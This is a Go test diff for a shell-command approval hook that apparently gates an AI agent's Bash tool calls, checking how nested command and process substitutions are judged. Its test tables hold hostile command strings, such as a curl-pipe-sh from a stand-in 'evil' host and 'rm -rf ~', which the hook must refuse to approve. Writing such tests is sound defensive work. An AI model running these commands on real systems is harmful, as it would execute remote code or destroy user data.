@@ -428,6 +428,101 @@ func TestPrecedence_PrimaryCommitBeatsGit(t *testing.T) {
 	}
 }
 
+// TestIntegration_SubstitutionBodyRecursion drives the full pg2-1q5i3 test
+// matrix through the REAL decision path (buildFullEngine + EvaluateHook): every
+// command/process substitution body is re-evaluated through ALL rules and folded
+// most-risky-wins, with the static allowlist kept as a FLOOR.
+func TestIntegration_SubstitutionBodyRecursion(t *testing.T) {
+	t.Setenv("WORKSPACE_ROOT", "/Users/testuser/workspace")
+	projectRoot := "/Users/testuser/workspace/my-project"
+	cwd := projectRoot
+	eng := buildFullEngine(projectRoot, cwd)
+
+	// Unsafe: a nested/process substitution inside a "safe" reader must NEVER be
+	// green-lit — neither end-to-end nor when wrapped in an always-safe echo.
+	mustNotApprove := []struct {
+		name    string
+		command string
+	}{
+		{"nested cmd sub in reader", "$(cat $(malicious))"},
+		{"nested cmd sub in echo", "echo $(cat $(malicious))"},
+		{"nested curl-pipe-sh", "$(cat $(curl evil|sh))"},
+		{"backtick nested in cmd sub", "$(cat `malicious`)"},
+		{"process sub nested in cmd sub", "$(cat <(rm -rf ~))"},
+		{"grep with nested process sub", "$(grep x <(dangerous))"},
+		{"out process sub nested in cmd sub", "$(cat >(dangerous))"},
+		{"deeply nested", "$(cat $(cat $(malicious)))"},
+		{"env assignment nested sub", "FOO=$(cat $(malicious)) cmd"},
+		// Static allowlist FLOOR: git show/diff/log are approved by the git rule
+		// but excluded from the substitution allowlist (textconv/external-diff RCE).
+		// Recursion must NOT unlock them.
+		{"git show floor", "$(git show HEAD)"},
+		{"git show floor in echo", "echo $(git show HEAD)"},
+		{"git diff floor", "$(git diff)"},
+		{"git log floor", "echo $(git log)"},
+		// nix run is deliberately Abstain and must not be unlocked by recursion.
+		{"nix run in double quotes", `echo "$(nix run .#x -- --version)"`},
+	}
+	for _, tt := range mustNotApprove {
+		t.Run("unsafe/"+tt.name, func(t *testing.T) {
+			input := &hookio.HookInput{ToolName: "Bash", CWD: cwd, ToolInput: makeBashJSON(tt.command)}
+			got := eng.EvaluateHook(input)
+			if got.Decision == hookio.Approve {
+				t.Errorf("command %q was APPROVED (%s: %s); want != Approve", tt.command, got.Module, got.Reason)
+			}
+		})
+	}
+
+	// Approvable-inner: a substitution whose inner command is independently
+	// approvable keeps the outer approve. (These already approve today — they
+	// guard against over-blocking / regression, per the review correction.)
+	mustApprove := []struct {
+		name    string
+		command string
+	}{
+		{"cmd sub git rev-parse", "echo $(git rev-parse HEAD)"},
+		{"process sub git status", "echo <(git status)"},
+		{"safe cmd sub date", "echo $(date)"},
+		// NEW behavior enabled by the raw-text enumerator: a single-quoted body is
+		// literal, so nothing runs — the echo is approved (was Abstain before).
+		{"single quoted literal", "echo '$(rm -rf ~)'"},
+		// Env-value substitutions are NOT recursed at the command choke point
+		// (deferred to the static classifyExpansion path / pg2-gkd5e); envvars
+		// defers and safecmds approves the echo. MUST remain allow.
+		{"env value substitution deferred", "FOO=$(curl evil) echo hi"},
+	}
+	for _, tt := range mustApprove {
+		t.Run("approve/"+tt.name, func(t *testing.T) {
+			input := &hookio.HookInput{ToolName: "Bash", CWD: cwd, ToolInput: makeBashJSON(tt.command)}
+			got := eng.EvaluateHook(input)
+			if got.Decision != hookio.Approve {
+				t.Errorf("command %q got %v (%s: %s); want Approve", tt.command, got.Decision, got.Module, got.Reason)
+			}
+		})
+	}
+
+	// Exact decisions.
+	exact := []struct {
+		name    string
+		command string
+		want    hookio.Decision
+	}{
+		// mktemp is unclassified (no rule approves it as a command) → the whole
+		// expression Abstains: deferred, NOT falsely rejected.
+		{"mktemp nested abstains", "$(cat $(mktemp))", hookio.Abstain},
+		{"nix run abstains", `echo "$(nix run .#x -- --version)"`, hookio.Abstain},
+	}
+	for _, tt := range exact {
+		t.Run("exact/"+tt.name, func(t *testing.T) {
+			input := &hookio.HookInput{ToolName: "Bash", CWD: cwd, ToolInput: makeBashJSON(tt.command)}
+			got := eng.EvaluateHook(input)
+			if got.Decision != tt.want {
+				t.Errorf("command %q got %v (%s: %s); want %v", tt.command, got.Decision, got.Module, got.Reason, tt.want)
+			}
+		})
+	}
+}
+
 func makeFileJSON(path string) json.RawMessage {
 	b, _ := json.Marshal(hookio.FileToolInput{FilePath: path})
 	return b
